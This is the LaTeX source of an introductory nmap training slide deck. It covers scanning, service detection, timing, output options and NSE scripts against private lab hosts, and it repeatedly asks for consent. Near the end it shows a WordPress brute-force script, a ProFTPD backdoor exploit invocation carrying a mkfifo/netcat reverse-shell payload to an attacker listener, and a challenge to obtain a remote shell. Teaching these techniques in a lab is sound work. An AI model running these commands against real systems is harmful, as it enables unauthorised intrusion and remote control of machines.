\documentclass[aspectratio=169,xcolor=dvipsnames]{beamer}
\usepackage{listings}
\usepackage{multirow}
\usepackage{hyperref}

\usetheme{SimplePlus}

\definecolor{slightblue}{RGB}{0, 104, 173}

\definecolor{mygray}{RGB}{200, 200, 200}
\definecolor{mygreen}{RGB}{0, 186, 11}
\definecolor{myyellow}{RGB}{179, 176, 16}
\definecolor{myblack}{RGB}{30, 33, 35}

\lstset{ 
    backgroundcolor=\color{myblack},
    language=bash,
    basicstyle=\ttfamily\color{mygray},
    morekeywords={*,sudo, nmap, root@kali},
    keywordstyle=\color{mygreen},
    stringstyle=\color{myyellow},
    showstringspaces=false,
    breaklines=true,
    mathescape=true,
}

\AtBeginSection[]{
  \begin{frame}
  \vfill
  \centering
  \begin{beamercolorbox}[sep=8pt,center,shadow=true,rounded=true]{title}
    \usebeamerfont{title}\insertsectionhead\par%
  \end{beamercolorbox}
  \vfill
  \end{frame}
}

\title{\texttt{nmap} 101}
\author{Santiago Gimenez Ocano}
\date{}

\begin{document}

\begin{frame}
    \titlepage
\end{frame}

\begin{frame}
    \frametitle{About Me}

    \begin{itemize}
        \item Lead Security Engineer at Praetorian
        \item UtahSAINT member since 2019
        \item DC435 "member" since 2019
        \item Argentina
    \end{itemize}

\end{frame}

\begin{frame}
    \frametitle{Disclaimer}
    
    \begin{alertblock}{Warning}
        \begin{center}
            This document is only for education purposes. Before scanning a network, always ask for consent.
        \end{center}
    \end{alertblock}

\end{frame}

\begin{frame}
    \frametitle{Agenda}
    \tableofcontents
\end{frame}

\section{Introduction and Basic Usage}

\subsection{Introduction}

\begin{frame}
    \frametitle{Introduction}

    \begin{columns}
        \begin{column}{0.5\textwidth}

            \texttt{nmap} (``Network Mapper'') is a free an open-source utility for network discovery and security auditing.

        \end{column}

        \pause

        \begin{column}{0.5\textwidth}
    
            \texttt{nmap} can determine:

            \begin{itemize}
                \item what hosts are available on the network,
                \item what services those hosts are offering,
                \item what operating systems they are running,
                \item what type of pachet filters/firewalls are in use.
            \end{itemize}

        \end{column}
    \end{columns}

\end{frame}

\begin{frame}
    \frametitle{Introduction}

    \begin{exampleblock}{Key Takeaway}
        \begin{center}
            \texttt{nmap} is a network scanner.
        \end{center}
    \end{exampleblock}

    \pause

    \begin{exampleblock}{Key Takeaway}
        \begin{center}
            \texttt{nmap} allows us to know how the network really is as opposed to how it should be.
        \end{center}
    \end{exampleblock}

\end{frame}

\subsection{Basic Usage}
\begin{frame}[fragile]

    \frametitle{Basic Usage}

    \begin{exampleblock}{Key Takeaway}
        \begin{center}
            Methodology: From a broad perspective to the details.
        \end{center}
    \end{exampleblock}

    \pause

    \begin{center}
        \begin{tabular}{rc}
            \Huge$\uparrow$ & 
            \begin{tabular}{cc}
                \textbf{\texttt{nmap} phases} & \textbf{TCP/IP Model}\\ \hline
                Script scanning & Application \\ \hline
                Port scanning & Transport \\ \hline
                \multirow{2}{*}{System discovery} & Internet\\ \cline{2-2}
                & Link \\ \hline
            \end{tabular}
        \end{tabular}
    \end{center}

\end{frame}

\begin{frame}[fragile]
    \frametitle{Basic Usage}

    \begin{lstlisting}
 root@kali $\#$ nmap [Scan Type] [Options] {targets}
    \end{lstlisting}

    \texttt{Targets}:

    \begin{itemize}
        \item URLs,
        \item list of IP addresses,
        \item network addresses in CDIR,
        \item mix of previous,
        \item from a file.
    \end{itemize}

\end{frame}

\begin{frame}[fragile]
    \frametitle{Basic Usage}
    \begin{lstlisting}
 root@kali $\#$ nmap 192.168.56.16
    \end{lstlisting}

    This will ping the host, then scan the top-1000 most used TCP ports.

    \pause

    \begin{lstlisting}
 root@kali $\#$ nmap 192.168.56.0/24
    \end{lstlisting}

    This will ping and then scan for the top-1000 most used TCP ports, but for the entire subnetwork.

    \pause

    \begin{lstlisting}
 root@kali $\#$ nmap 192.168.56.16-19
    \end{lstlisting}

    This is the same as to the previous example, but we use a list of IP addresses.

    \pause

    \begin{lstlisting}
 root@kali $\#$ nmap -iL targets.txt
    \end{lstlisting}

    This will ping and then scan the top-1000 most used TCP ports, based on the hosts in the list.

\end{frame}

\section{Options}

\subsection{Modifying The Standard Scan Command}

\begin{frame}
    \frametitle{Modifying The Standard Scan Command}

    There are different types of options, the ones related to ports allow us to:

    \begin{itemize}
        \item change the number of top ports to scan,
        \item specify ports to be scanned,
        \item show only open ports,
        \item scan UDP ports.
    \end{itemize}

\end{frame}

\begin{frame}[fragile]
    \frametitle{Modifying The Standard Scan Command}

    \begin{lstlisting}
 root@kali $\#$ nmap --top-ports 10 192.168.56.16
    \end{lstlisting}

    Scan only the top-10 most common ports.

    \pause

    \begin{lstlisting}
 root@kali $\#$ nmap -F 192.168.56.16
    \end{lstlisting}

    Scan the top-100 ports. This is called a fast scan.

    \pause

    \begin{lstlisting}
 root@kali $\#$ nmap -p- 192.168.56.16
    \end{lstlisting}

    scan all ports in the target.

\end{frame}

\begin{frame}[fragile]
    \frametitle{Modifying The Standard Scan Command}

    \begin{lstlisting}
 root@kali $\#$ nmap -p22,80,443 192.168.56.17
    \end{lstlisting}

    Scan only specific ports.

    \pause

    \begin{lstlisting}
 root@kali $\#$ nmap --open -p22,80,443 192.168.56.17
    \end{lstlisting}

    Same to the previous one, but show only the open ports. It will not show filtered ports.

    \pause

    \begin{lstlisting}
 root@kali $\#$ nmap -sU --top-ports 10 192.168.56.16
    \end{lstlisting}

    Scan the top-10 most used UDP ports.

\end{frame}

\subsection{Getting More Information from \texttt{nmap}}

\begin{frame}
    \frametitle{Getting More Information from \texttt{nmap}}

    The additional information we can get from \texttt{nmap} includes:

    \begin{itemize}
        \item OS fingerprinting,
        \item service name and version,
        \item vulnerabilities.
    \end{itemize}

\end{frame}

\begin{frame}[fragile]
    \frametitle{Getting More Information from \texttt{nmap}}

    \begin{lstlisting}
 root@kali $\#$ nmap -O 192.168.56.16
    \end{lstlisting}

    OS fingerprinting.

    \pause

    \begin{lstlisting}
 root@kali $\#$ nmap -sV 192.168.56.16
    \end{lstlisting}

    Service name and version detection.

    \pause

    \begin{lstlisting}
 root@kali $\#$ nmap -sC 192.168.56.16
    \end{lstlisting}

    Additional information from services.

    \pause

    \begin{lstlisting}
 root@kali $\#$ nmap -A 192.168.56.16
    \end{lstlisting}

    All the previous examples, plus a \texttt{traceroute}

\end{frame}

\section{Timing and Output}

\subsection{Controlling The Scan's Speed}

\begin{frame}[fragile]
    \frametitle{Timing}

    \texttt{nmap} automatically controls the speed of the scan based on network congestion.

    \pause

    \vspace{1em}
  
    However, we can overwrite this with:

    \begin{itemize}
        \item \texttt{-T0} (paranoid), 
        \item \texttt{-T1} (sneaky), 
        \item \texttt{-T2} (polite),
        \item \texttt{-T3} (normal),
        \item \texttt{-T4} (aggressive),
        \item \texttt{-T5} (insane)
    \end{itemize}

    \pause

    \begin{lstlisting}
 root@kali $\#$ nmap -T5 192.168.56.16
    \end{lstlisting}

    \pause

    \begin{lstlisting}
 root@kali $\#$ nmap -T0 192.168.56.16
    \end{lstlisting}

\end{frame}

\subsection{Saving the Output}

\begin{frame}[fragile]
    \frametitle{Saving the Output}

    Output format options:

    \begin{lstlisting}
 root@kali $\#$ nmap [frmt {<file_name>}] {targets}
    \end{lstlisting}

    \pause

    Where \texttt{frmt}:

    \begin{itemize}
        \item \texttt{-oN} is for regular files,
        \item \texttt{-oX} is for XML files,
        \item \texttt{-oG} is for greppable files.
    \end{itemize}

    \pause

    \begin{lstlisting}
 root@kali $\#$ nmap -oG results.txt 192.168.56.16
    \end{lstlisting}
    
\end{frame}

\section{Scripts}

\begin{frame}[fragile]
    \frametitle{Scripts}

    Scripts:

    \begin{itemize}
        \item extend the behavior of \texttt{nmap},
        \item are run after open ports have been discovered,
        \item allows us to:
        \begin{itemize}
            \item Get additional information (-C),
            \item find categories of vulnerabilities,
            \item find specific vulnerabilities.
        \end{itemize}
    \end{itemize}

    \pause

    \begin{alertblock}{Warning}
        \begin{center}
            Some of these scripts are considered intrusive.
        \end{center}
    \end{alertblock}

\end{frame}

\begin{frame}[fragile]
    \frametitle{Scripts}

    \begin{lstlisting}
 root@kali $\#$ nmap [--script=<script> [--script-args=<script_arguments>]] {targets}
    \end{lstlisting}

\end{frame}


\begin{frame}[fragile]
    \frametitle{Scripts}

    \begin{lstlisting}
 root@kali $\#$ nmap --script=vuln 192.168.56.16
    \end{lstlisting}

    Run all the scripts in the category vulnerability against the target.

    \pause

    \begin{lstlisting}
 root@kali $\#$ nmap --script="http-robots*" 192.168.56.16
    \end{lstlisting}

    Show the content of the \texttt{robots.txt} file.

    \pause

    \begin{lstlisting}
 root@kali $\#$ nmap -sV --script="http-wordpress-brute*" --script-args="passdb=./dict.txt" 192.168.56.16
    \end{lstlisting}

    Brute-force attack a Wordpress login page.

\end{frame}

\begin{frame}[fragile]
    \frametitle{Scripts}

    \begin{lstlisting}
 root@kali $\#$ nmap -sV --script="ftp-proftpd-backd*" 192.168.56.19
    \end{lstlisting}

    Check if the target is vulnerable to a specific vulnerability.

    \pause       

    \begin{lstlisting}
 root@kali $\#$ nmap -sV --script="ftp-proftpd-back*" --script-args="cmd=ls" 192.168.56.19
    \end{lstlisting}

    List the content of a directory. We do this by modifying the arguments of the script.

\end{frame}

\begin{frame}[fragile]
    \frametitle{Scripts}

    \begin{lstlisting}
 root@kali $\#$ nmap -sV --script="ftp-proftpd-back*" --script-args="cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>\&1|nc 192.168.56.1 4444 >/tmp/f" 192.168.56.19
    \end{lstlisting}

    Create a remote connection back to the attacker's machine.

    \begin{block}{Heads-up}
        \begin{center}
            You will need to have a \texttt{netcat} listener at port 4444 in your host machine. In Kali linux, you can use \texttt{nc -lvnp 4444} in a different terminal.
        \end{center}
    \end{block}  
\end{frame}

\section{Recap}

\begin{frame}[fragile]
    \frametitle{Warning}

    \begin{alertblock}{Warning}
        \begin{center}
            Before scanning a network, always ask for consent.
        \end{center}
    \end{alertblock}  

\end{frame}

\begin{frame}[fragile]
    \frametitle{Takeways}

    \begin{exampleblock}{Key Takeaway}
        \begin{center}
            \texttt{nmap} is a network scanner.
        \end{center}
    \end{exampleblock}

    \pause

    \begin{exampleblock}{Key Takeaway}
        \begin{center}
            \texttt{nmap} allows us to know how the network really is as opposed to how it should be.
        \end{center}
    \end{exampleblock}

    \pause

    \begin{exampleblock}{Key Takeaway}
        \begin{center}
            Methodology: From a broad perspective to the details.
        \end{center}
    \end{exampleblock}

\end{frame}

\begin{frame}[fragile]
    \frametitle{What We Covered Today}
    
    We covered how to:

    \begin{itemize}
        \item Find systems in a network,
        \item Find open ports in those systems,
        \item Get the name and verion of services,
        \item Execute scripts to get more info,
        \item Execute scripts to find vulnerabilities,
        \item Execure scripts to exploit vulnerabilities.
    \end{itemize}

    \pause

    \begin{alertblock}{Warning}
        \begin{center}
            Some scripts are considered intrusive.
        \end{center}
    \end{alertblock}

    \pause

    \begin{exampleblock}{}
        \begin{center}
            This is only the tip of the iceberg!
        \end{center}
    \end{exampleblock}

\end{frame}

\begin{frame}

    \centering
    \Huge\textbf{\structure{Q \& A}}

\end{frame}

\begin{frame}
   \frametitle{References}
   
    \begin{thebibliography}{9}        
        \bibitem{site}
            \texttt{https://nmap.org}
        \bibitem{man}
            \texttt{\# man nmap}
        \bibitem{scripts}
            \texttt{https://nmap.org/nsedoc/index.html}
        \bibitem{book1}
            \texttt{https://nmap.org/book}
        \bibitem{book2}
            Marsh, Nicholas. \textit{Nmap 6 Cookbook: The Fat-Free Guide to Network Scanning}.2015
        \bibitem{templatte}
            Slide Templates: SimplePlus-BeamerTheme. \texttt{https://github.com/PM25/SimplePlus-BeamerTheme}
    \end{thebibliography}

\end{frame}

\begin{frame}
    \frametitle{Challenge}

    \begin{enumerate}
        \item Identify the hidden port in 192.168.56.19.
        \item Identify the name of the service and version in the hidden port.
        \item Identify if the service is vulnerable to an exploit.
        \item Obtain a remote shell by changing the script arguments.
    \end{enumerate}

\end{frame}

\end{document}